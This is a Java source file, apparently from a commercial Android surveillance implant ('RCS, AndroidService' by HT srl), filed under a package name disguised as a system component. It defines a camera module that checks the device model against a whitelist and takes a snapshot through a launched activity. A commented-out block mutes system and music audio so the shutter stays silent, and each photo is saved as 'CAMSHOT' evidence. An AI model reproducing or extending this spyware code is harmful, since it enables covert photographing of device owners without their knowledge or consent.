/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.IOException;
import java.util.logging.LogRecord;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.media.AudioManager;
import android.os.Build;
import android.view.SurfaceHolder;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.gui.AGUI;
import com.android.networking.gui.CGui;
import com.android.networking.interfaces.SnapshotManager;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

//SNIPPET http://marakana.com/forums/android/examples/39.html
/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	@Override
	public void actualStart() {
		try {
			snapshot();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}

	/** Check if this device has a camera */
	private boolean checkCameraHardware() {
	    if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
	        // this device has a camera
	    	if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), camera present");
			}
	        return true;
	    } else {
	        // no camera on this device
	    	if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), no camera");
			}
	        return false;
	    }
	}
	
	String[] whiteList=new String[]{"LT18i", "GT-I9300"};
	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		for (String white : whiteList) {
			if(Build.MODEL.equals(white)){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse), found white: " + Build.MODEL);
				}
				return checkCameraHardware();
			}
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (parse), unknown Build.Model:" +Build.MODEL);
		}
		return false;
	}

	/**
	 * Snapshot.
	 * 
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		Status status = Status.self();

		Intent intent = new Intent(Status.getAppContext(), CGui.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(intent);
		
		/*	Utils.sleep(1000);
			if (status.preview != null) {
				// status.gui.addPreview();
				final ModuleCamera moduleCamera = this;
				Status.self().preview.post(new Runnable() {
					@Override
					public void run() {
						if (Status.self().preview.startCamera(moduleCamera)) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (snapshot), camera started");
							}
							
							Utils.sleep(500);
							
							AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		
							audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
							audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
						

							Status.self().preview.click();
					
					
						}else{
								if (Cfg.DEBUG) {
									Check.log(TAG + " (snapshot), cannot start camera");
								}
								Status.self().preview.stopCamera();
								Status.self().gui.removePreview();
						}
					
					}
				});
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot), null preview");
				}
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (snapshot), null gui :");
			}
		}*/
	}


	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: "+ bs.length);
		}
		EvidenceReference.atomic(EvidenceType.CAMSHOT, null, bs);
	}

}
